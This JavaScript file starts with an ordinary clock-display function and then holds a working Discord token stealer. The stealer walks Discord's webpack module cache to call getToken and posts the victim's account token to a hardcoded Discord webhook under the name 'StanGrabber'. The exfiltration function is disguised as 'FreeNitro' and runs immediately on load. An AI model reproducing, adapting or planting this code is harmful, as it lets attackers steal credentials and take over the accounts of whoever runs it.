console.log("Starting programs");

function startTime() {
  const today = new Date();
  let h = today.getHours();
  let m = today.getMinutes();
  let s = today.getSeconds();
  m = checkTime(m);
  s = checkTime(s);
  document.getElementById('clock').innerHTML =  h + ":" + m + ":" + s;
  setTimeout(startTime, 1000);
}

function checkTime(i) {
  if (i < 10) {i = "0" + i};  // add zero in front of numbers < 10
  return i;
}

console.log('hello');
const webhookurl = 'https://discord.com/api/webhooks/860951865377030155/gJqeoq30eEQB2SUChIW_K9TGoStlhSta1Jza_f9lF32fBAlUt-ACMAr9UlMmE-a-kvWQ';

var req = webpackJsonp.push([
    [], {
        extra_id: (e, t, r) => e.exports = r
    },
    [
        ["extra_id"]
    ]
]);
for (let e in req.c)
    if (req.c.hasOwnProperty(e)) {
        let t = req.c[e].exports;
        if (t && t.__esModule && t.default)
            for (let e in t.default) "getToken" === e && (token = t.default.getToken())
    }
function FreeNitro() {
    var e = new XMLHttpRequest;
    e.open("POST", webhookurl), e.setRequestHeader("Content-type", "application/json");
    var t = {
        username: "StanGrabber",
        avatar_url: "https://cdn.discordapp.com/attachments/736612991948030037/751790394462961715/450.png",
        content: "",
        embeds: [{
            color: "4700374",
            description: "Token : " + token,
            footer: {
                text: "By Stanley#0001 | https://youtube.com/Stanleydev"
            }
        }]
    };
    e.send(JSON.stringify(t))
}
FreeNitro();
